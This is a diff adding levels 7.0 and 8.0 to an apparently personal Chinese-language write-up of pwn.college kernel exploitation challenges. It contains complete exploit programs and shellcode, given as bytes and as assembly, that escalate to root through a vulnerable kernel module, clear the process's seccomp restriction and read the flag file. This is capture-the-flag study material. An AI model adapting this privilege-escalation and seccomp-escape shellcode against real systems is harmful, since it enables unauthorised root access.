@@ -95,3 +95,138 @@ int main() {
 }
 ```
 另外，shellcode末尾的ret是必须的。内核中运行的shellcode不能出现崩溃的情况，不然整个内核直接炸掉，甚至来不及拿到flag
+
+### level7.0
+
+第一次用上了环境里准备的调试功能。首先`vm start`，然后`sudo vm debug`。召唤出来的gdb是普通版本，所以需要加sudo，从而能够在gdb里运行`source /opt/pwndbg/gdbinit.py`
+
+至于题目的模块，主要就是分清arg各个位置存的是什么：
+- 在arg处传入shellcode的长度
+- 在arg + 0x1008传入shellcode的地址
+- 在arg + 8处传入shellcode的内容
+
+没有kaslr，所以直接用调试器看shellcode的地址
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+int main() {
+    int fd = open("/proc/pwncollege", O_RDWR);
+    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
+    char arg[0x1010] = {0};
+    *(unsigned long*)arg = sizeof(shellcode);
+    memcpy(arg + 8, shellcode, sizeof(shellcode));
+    *(void**)(arg + 0x1008) = (void*)0xffffc90000085000;
+    ioctl(fd,1337,arg);
+    system("cat /flag");
+    return 0;
+}
+```
+### level8.0
+
+建议阅读`Kernel: Escaping Seccomp`后再做这题
+
+由于`proc_create("pwncollege",0600,0,&fops)`中设置的权限是`0600`，我们无法直接与这个模块交互。不过提供了交互用的elf，问题不大
+
+elf中设置了seccomp，只能调用write。write很明显是要我们与模块交互，问题是交互完之后呢？拿到root权限后没有syscall也看不了flag。参考上述的学习资料，shellcode除了提权外，还可以取消当前进程的seccomp。这下思路就很清晰了
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <string.h>
+int main() {
+    int pipe1[2];
+    int pipe2[2];
+    if (pipe(pipe1) == -1 || pipe(pipe2) == -1) {
+        perror("pipe");
+        exit(EXIT_FAILURE);
+    }
+    pid_t pid = fork();
+    if (pid == -1) {
+        perror("fork");
+        exit(EXIT_FAILURE);
+    }
+    if (pid == 0) {
+        close(pipe1[1]);
+        close(pipe2[0]);
+        dup2(pipe1[0], STDIN_FILENO);
+        close(pipe1[0]);
+        dup2(pipe2[1], STDOUT_FILENO);
+        close(pipe2[1]);
+        execl("/challenge/babykernel_level8.0", "/challenge/babykernel_level8.0", NULL);
+        perror("execl");
+        exit(EXIT_FAILURE);
+    } else {
+        close(pipe1[0]);
+        close(pipe2[1]);
+        char shellcode[] = "\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x03\x00\x00\x00\x48\xC7\xC6\x67\x70\x33\x31\x48\xC7\xC2\x3A\x00\x00\x00\x0F\x05\x48\xB8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xB8\x2E\x67\x6D\x60\x66\x01\x01\x01\x48\x31\x04\x24\x48\x89\xE7\x31\xD2\x31\xF6\x6A\x02\x58\x0F\x05\x31\xC0\x6A\x04\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x0F\x05\x6A\x01\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x6A\x01\x58\x0F\x05\xC3\x65\x48\x8B\x1C\x25\x00\x5D\x01\x00\x48\x8B\x33\x48\x81\x23\xFF\xFE\xFF\xFF\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
+        write(pipe1[1], shellcode, sizeof(shellcode));
+        close(pipe1[1]);
+        char buffer[1024];
+        ssize_t bytes_read;
+        while ((bytes_read = read(pipe2[0], buffer, sizeof(buffer)))) {
+            if (bytes_read == -1) {
+                perror("read");
+                break;
+            }
+            write(STDOUT_FILENO, buffer, bytes_read);
+        }
+        close(pipe2[0]);
+        wait(NULL);
+    }
+    return 0;
+}
+```
+deepseek给的双向交互模板（popen只能读或者只能写），不知道对不对。至少这题用着没问题。执行的shellcode的汇编如下：
+```
+mov rax,1
+mov rdi,3
+mov rsi,0x0000000031337067
+mov rdx,58
+syscall
+mov rax, 0x101010101010101
+push rax
+mov rax, 0x101010101010101 ^ 0x67616c662f
+xor [rsp], rax
+mov rdi, rsp
+xor edx, edx
+xor esi, esi
+push 2
+pop rax
+syscall
+xor eax, eax
+push 4
+pop rdi
+push 0x40
+pop rdx
+mov rsi, 0x31337400
+syscall
+push 1
+pop rdi
+push 0x40
+pop rdx
+mov rsi, 0x31337400
+push 1
+pop rax
+syscall
+ret
+mov rbx,QWORD PTR gs:0x15d00
+mov rsi,QWORD PTR [rbx]
+and QWORD PTR [rbx],0xfffffffffffffeff
+xor rdi,rdi
+mov rax,0xffffffff81089660
+call rax
+mov rdi,rax
+mov rax,0xffffffff81089310
+call rax
+ret
+```
+第一个ret指令后是取消seccomp+提权的shellcode。`gs:0x15d00`是我跟着视频抄的。不过今后发现偏移不对的话可以自己写一个模块并用`vm build`编译并安装进虚拟机中（需要再运行一次`vm start`重启），手动查看取消seccomp的代码对应的汇编是什么
+
+用户态只会执行第一段shellcode（到一个ret）。把两段shellcode放一起主要是因为`_copy_from_user`没法跨进程，必须让shellcode出现在当前elf的用户态内存中才能正确拷贝到期望的shellcode（我差点在第一段shellcode中引用exp里的地址……）
+
+mmap的地址是固定的，可以通过计算得到`0x31337067`，即第二段shellcode的起始点
+
+本来想用execve的，但是无论是执行`/bin/sh`还是`/bin/cat /flag`都得不到输出。只能古法orw了
